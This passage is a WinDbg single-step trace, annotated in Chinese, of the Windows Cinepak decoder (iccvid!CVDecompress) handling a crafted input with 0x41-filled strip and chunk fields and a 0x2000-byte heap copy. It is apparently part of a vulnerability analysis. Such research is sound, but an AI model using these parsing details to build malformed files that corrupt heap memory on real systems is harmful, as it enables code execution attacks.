class="number">0x108</span>:</span><br><span class="line">73b722b6 803e11          <span class="keyword">cmp</span>     <span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>],<span class="number">11h</span>         <span class="built_in">ds</span>:<span class="number">0023</span>:00ba6912=<span class="number">11</span> <span class="comment">; 判断Strip CVID ID的高位字节是否为0x11</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00002000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00004141</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b722b9 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x10b</span>:</span><br><span class="line">73b722b9 <span class="number">7516</span>            <span class="keyword">jne</span>     iccvid!CVDecompress+<span class="number">0x123</span> (73b722d1)    [br=<span class="number">0</span>] <span class="comment">; 不等于则跳转，这里不跳转</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00002000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00004141</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b722bb <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x10d</span>:</span><br><span class="line">73b722bb 8b4b1c          <span class="keyword">mov</span>     <span class="built_in">ecx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebx</span>+<span class="number">1Ch</span>] <span class="built_in">ds</span>:<span class="number">0023</span>:001535cc=001535f8 <span class="comment">; ebx = a1 = 001535b0,ecx = 0x001535f8,堆块数据区域指针</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00002000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=001535f8 <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=<span class="number">00000000</span></span><br><span class="line"><span class="built_in">eip</span>=73b722be <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x110</span>:</span><br><span class="line">73b722be 8d3c01          <span class="keyword">lea</span>     <span class="built_in">edi</span>,[<span class="built_in">ecx</span>+<span class="built_in">eax</span>]                                  <span class="comment">; edi = 0x001555f8,堆块数据区域指针增加0x2000</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00002000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=001535f8 <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=001555f8</span><br><span class="line"><span class="built_in">eip</span>=73b722c1 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x113</span>:</span><br><span class="line">73b722c1 b900080000      <span class="keyword">mov</span>     <span class="built_in">ecx</span>,<span class="number">800h</span>                                       <span class="comment">; ecx = 0x800,复制数据长度0x800*4=0x2000</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00002000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000800</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=001555f8</span><br><span class="line"><span class="built_in">eip</span>=73b722c6 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x118</span>:</span><br><span class="line">73b722c6 8db700e0ffff    <span class="keyword">lea</span>     <span class="built_in">esi</span>,[<span class="built_in">edi</span>-<span class="number">2000h</span>]                                <span class="comment">; esi = 0x001535f8,堆块数据区域首指针</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00002000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000800</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=001535f8 <span class="built_in">edi</span>=001555f8</span><br><span class="line"><span class="built_in">eip</span>=73b722cc <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x11e</span>:</span><br><span class="line">73b722cc f3a5            <span class="keyword">rep</span> movs <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">es</span>:[<span class="built_in">edi</span>],<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">esi</span>]            <span class="comment">; 第1次复制数据</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00002000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000000</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=001555f8 <span class="built_in">edi</span>=001575f8</span><br><span class="line"><span class="built_in">eip</span>=73b722ce <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x120</span>:</span><br><span class="line">73b722ce 8b75e8          <span class="keyword">mov</span>     <span class="built_in">esi</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">18h</span>] <span class="built_in">ss</span>:<span class="number">0023</span>:025afd18=00ba6912 <span class="comment">; esi = [ebp-18h] = 0x00ba6912,指向第2个Strip Header</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00002000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000000</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=001575f8</span><br><span class="line"><span class="built_in">eip</span>=73b722d1 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x123</span>:</span><br><span class="line">73b722d1 8b7df4          <span class="keyword">mov</span>     <span class="built_in">edi</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">0Ch</span>] <span class="built_in">ss</span>:<span class="number">0023</span>:025afd24=00ba6912 <span class="comment">; edi = [ebp-0Ch] = 0x00ba6912,指向第2个Strip Header</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00002000</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000000</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=00ba6912</span><br><span class="line"><span class="built_in">eip</span>=73b722d4 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x126</span>:</span><br><span class="line">73b722d4 8b4320          <span class="keyword">mov</span>     <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebx</span>+<span class="number">20h</span>] <span class="built_in">ds</span>:<span class="number">0023</span>:001535d0=001535f8 <span class="comment">; ebx = a1 = 0x001535b0,eax = 0x001535f8,堆块数据区域首指针</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=001535f8 <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000000</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=00ba6912</span><br><span class="line"><span class="built_in">eip</span>=73b722d7 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x129</span>:</span><br><span class="line">73b722d7 83c70c          <span class="keyword">add</span>     <span class="built_in">edi</span>,<span class="number">0Ch</span>                                        <span class="comment">; edi = edi+0xC = 0x00ba691e,指向第2个CVID Chunk ID</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=001535f8 <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000000</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=00ba691e</span><br><span class="line"><span class="built_in">eip</span>=73b722da <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000206</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x12c</span>:</span><br><span class="line">73b722da 0345fc          <span class="keyword">add</span>     <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">4</span>] <span class="built_in">ss</span>:<span class="number">0023</span>:025afd2c=<span class="number">00002000</span> <span class="comment">; eax = 0x001555f8,堆块数据区域指针增加0x2000</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=001555f8 <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=<span class="number">00000000</span> <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=00ba691e</span><br><span class="line"><span class="built_in">eip</span>=73b722dd <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x12f</span>:</span><br><span class="line">73b722dd 8d4e0c          <span class="keyword">lea</span>     <span class="built_in">ecx</span>,[<span class="built_in">esi</span>+<span class="number">0Ch</span>]                                  <span class="comment">; ecx = esi+0xC = 0x00ba691e,指向第2个CVID Chunk ID</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=001555f8 <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba691e <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=00ba691e</span><br><span class="line"><span class="built_in">eip</span>=73b722e0 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x132</span>:</span><br><span class="line">73b722e0 <span class="number">894338</span>          <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebx</span>+<span class="number">38h</span>],<span class="built_in">eax</span> <span class="built_in">ds</span>:<span class="number">0023</span>:001535e8=001535f8 <span class="comment">; [ebx+38h] = eax = 0x001555f8,堆块数据区域指针增加0x2000</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=001555f8 <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba691e <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=00ba691e</span><br><span class="line"><span class="built_in">eip</span>=73b722e3 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x135</span>:</span><br><span class="line">73b722e3 8b4520          <span class="keyword">mov</span>     <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">20h</span>] <span class="built_in">ss</span>:<span class="number">0023</span>:025afd50=<span class="number">00000540</span> <span class="comment">; eax = a7 = 0x540</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000540</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba691e <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=00ba691e</span><br><span class="line"><span class="built_in">eip</span>=73b722e6 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x138</span>:</span><br><span class="line">73b722e6 894de8          <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>-<span class="number">18h</span>],<span class="built_in">ecx</span> <span class="built_in">ss</span>:<span class="number">0023</span>:025afd18=00ba6912 <span class="comment">; [ebp-18h] = ecx = 00ba691e,指向第2个CVID Chunk ID</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000540</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba691e <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=00ba691e</span><br><span class="line"><span class="built_in">eip</span>=73b722e9 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x13b</span>:</span><br><span class="line">73b722e9 89433c          <span class="keyword">mov</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebx</span>+<span class="number">3Ch</span>],<span class="built_in">eax</span> <span class="built_in">ds</span>:<span class="number">0023</span>:001535ec=<span class="number">00000540</span> <span class="comment">; ebx = a1 = 0x001535b0,[ebx+3Ch] = eax = a7 = 0x540</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000540</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba691e <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=00ba691e</span><br><span class="line"><span class="built_in">eip</span>=73b722ec <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x13e</span>:</span><br><span class="line">73b722ec e9be000000      <span class="keyword">jmp</span>     iccvid!CVDecompress+<span class="number">0x201</span> (73b723af)           <span class="comment">; </span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000540</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba691e <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=00ba691e</span><br><span class="line"><span class="built_in">eip</span>=73b723af <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl nz na po nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000202</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x201</span>:</span><br><span class="line">73b723af 837d0804        <span class="keyword">cmp</span>     <span class="built_in">dword</span> <span class="built_in">ptr</span> [<span class="built_in">ebp</span>+<span class="number">8</span>],<span class="number">4</span>  <span class="built_in">ss</span>:<span class="number">0023</span>:025afd38=<span class="number">00000004</span> <span class="comment">; 判断Size of strip data减去Strip Header大小后的数据大小是否大于等于4</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000540</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba691e <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=00ba691e</span><br><span class="line"><span class="built_in">eip</span>=73b723b3 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x205</span>:</span><br><span class="line">73b723b3 0f8338ffffff    <span class="keyword">jae</span>     iccvid!CVDecompress+<span class="number">0x143</span> (73b722f1)    [br=<span class="number">1</span>] <span class="comment">; 大于等于则跳转，这里跳转</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000540</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba691e <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=00ba691e</span><br><span class="line"><span class="built_in">eip</span>=73b722f1 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x143</span>:</span><br><span class="line">73b722f1 0fb64103        <span class="keyword">movzx</span>   <span class="built_in">eax</span>,<span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">ecx</span>+<span class="number">3</span>]       <span class="built_in">ds</span>:<span class="number">0023</span>:00ba6921=<span class="number">41</span> <span class="comment">; ecx = 0x00ba691e,指向第2个CVID Chunk ID,eax = 0x41,Size of chunk data的低位字节</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000041</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba691e <span class="built_in">edx</span>=025afd38 <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=00ba691e</span><br><span class="line"><span class="built_in">eip</span>=73b722f5 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x147</span>:</span><br><span class="line">73b722f5 33d2            <span class="keyword">xor</span>     <span class="built_in">edx</span>,<span class="built_in">edx</span>                                        <span class="comment">; edx = edx^edx = 0x00000000</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000041</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba691e <span class="built_in">edx</span>=<span class="number">00000000</span> <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=00ba691e</span><br><span class="line"><span class="built_in">eip</span>=73b722f7 <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x149</span>:</span><br><span class="line">73b722f7 8a7101          <span class="keyword">mov</span>     <span class="number">dh</span>,<span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">ecx</span>+<span class="number">1</span>]        <span class="built_in">ds</span>:<span class="number">0023</span>:00ba691f=<span class="number">41</span> <span class="comment">; dh = 0x41,第2个CVID Chunk ID的低位字节</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000041</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba691e <span class="built_in">edx</span>=<span class="number">00004100</span> <span class="built_in">esi</span>=00ba6912 <span class="built_in">edi</span>=00ba691e</span><br><span class="line"><span class="built_in">eip</span>=73b722fa <span class="built_in">esp</span>=025afd04 <span class="built_in">ebp</span>=025afd30 iopl=<span class="number">0</span>         nv <span class="meta">up</span> ei pl zr na pe nc</span><br><span class="line"><span class="built_in">cs</span>=<span class="number">001b</span>  <span class="built_in">ss</span>=<span class="number">0023</span>  <span class="built_in">ds</span>=<span class="number">0023</span>  <span class="built_in">es</span>=<span class="number">0023</span>  <span class="built_in">fs</span>=003b  <span class="built_in">gs</span>=<span class="number">0000</span>             efl=<span class="number">00000246</span></span><br><span class="line">iccvid!CVDecompress+<span class="number">0x14c</span>:</span><br><span class="line">73b722fa 8a5102          <span class="keyword">mov</span>     <span class="built_in">dl</span>,<span class="built_in">byte</span> <span class="built_in">ptr</span> [<span class="built_in">ecx</span>+<span class="number">2</span>]        <span class="built_in">ds</span>:<span class="number">0023</span>:00ba6920=<span class="number">41</span> <span class="comment">; dl = 0x41,Size of chunk data的高位字节</span></span><br><span class="line"><span class="number">0</span>:<span class="number">013</span>&gt; p</span><br><span class="line"><span class="built_in">eax</span>=<span class="number">00000041</span> <span class="built_in">ebx</span>=001535b0 <span class="built_in">ecx</span>=00ba691e <span class="built_in">edx</span>=<span class="number">00004141</span> <span 